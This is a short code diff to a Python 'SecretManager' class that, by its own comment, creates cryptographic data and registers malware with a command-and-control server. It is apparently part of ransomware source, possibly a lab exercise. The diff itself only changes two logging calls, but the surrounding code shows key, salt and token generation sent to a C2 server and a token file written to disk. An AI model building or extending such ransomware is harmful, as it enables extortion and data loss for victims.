@@ -42,6 +42,7 @@ class SecretManager:
    
     def create(self) -> Tuple[bytes, bytes, bytes]:
         self.do_derivation(urandom(SecretManager.SALT_LENGTH), urandom(SecretManager.KEY_LENGTH))
+        self._log.debug('cryptographic data generated:')
         self._log.debug((self._token, self._key, self._salt))
         return (self._salt, self._key, self._token)
 
@@ -83,7 +84,7 @@ class SecretManager:
         # main function to create crypto data and register malware to cnc
         self.create()
         post_status_code = self.post_new(self._salt, self._key, self._token)
-        self._log.info("post_new request returned with code " + str(post_status_code))
+        self._log.debug("post_new request returned with code " + str(post_status_code))
         if not Path(self._path).exists():  
             Path(self._path).mkdir(parents=True, exist_ok=True)
         if Path(self._path + '/token.bin').exists():
